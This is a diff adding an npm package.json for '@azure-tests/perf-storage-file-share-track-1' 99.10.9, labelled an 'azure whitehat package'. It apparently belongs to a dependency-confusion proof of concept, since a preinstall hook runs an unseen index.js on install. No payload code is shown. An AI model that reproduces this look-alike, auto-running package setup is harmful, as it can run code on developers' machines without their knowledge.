@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-storage-file-share-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-storage-file-share-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-FgLNHiv4S9e+d0ile/vl+KmziCeGLMUJrSxjALKZpIB0qFioaob/SSiJj4rYDwSrPn+Nl7roq9uJjsKep2LX3g==",
+        "shasum": "b85c67dc494240c6064e58aa8ce3856fccd4aab5",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-storage-file-share-track-1/-/perf-storage-file-share-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3608,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSQhCRA9TVsSAnZWagAAqzoP/1B3FwbMMi7gbTZA7yNn\nB1OjVZCaNHBAv9H53nDqENGCSklqKcSAIRcQt623ZrWwT5GzP7CpFttz0TI2\nlhLT505Drj5rIDMalRX2la/j44qp/WyvmljPvWb6VKkPp/AY1gn30JxZnFan\n7tJLaPXGikGWvVYE3FbNieHR+iodJHbDwmQkA4h+9GD9hy8z/QlMrhUxkxj7\n2PbpU3LZOEvkeqrN5lKIwqheRmn87yjWiPAYhf+979lssVc0itJWgf0nSY4J\n9RMqS4esY9sbo2XebrPd9JuYYG5pMlcCVhLFRKAgkEMUxfsjO9RGhcaoWSAl\nlGcOorGTT2OwGI5LCppmAg7d1SplrERHN1EhX1at64Stx8iNoQZzjlRddl9b\nMBx8hsG4AAraPiiOlrN6ljHG+6ZP1nVSIKH1oOutfoDOSxid8Pb+kBYlddcF\nfubGZ8yqvGdAyn6S8+OXJlpUQCAUCTW+gYRBzkhN/+NvStxUppx+zwUk763Y\npyUdemUf5Vk1r2X5+Ze6CEIx/8K4LQLXavvl8lIbZb7KdXiI/RMFBvYI3sUJ\nd2ddEsy++nR5lpZ8dbVjHUztxXKHfgqKki5vmpeX20+grSnLnXCmwP5f3JIN\nQgbIBtZH+ktZwJih77H8MUQpise30MjrIZ/zv60c3A1/KwwSXqIvm6UzngYU\nDYaB\r\n=nYX/\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-storage-file-share-track-1_99.10.9_1637950497713_0.13533917203159107"
+    },
+    "_hasShrinkwrap": false
+}
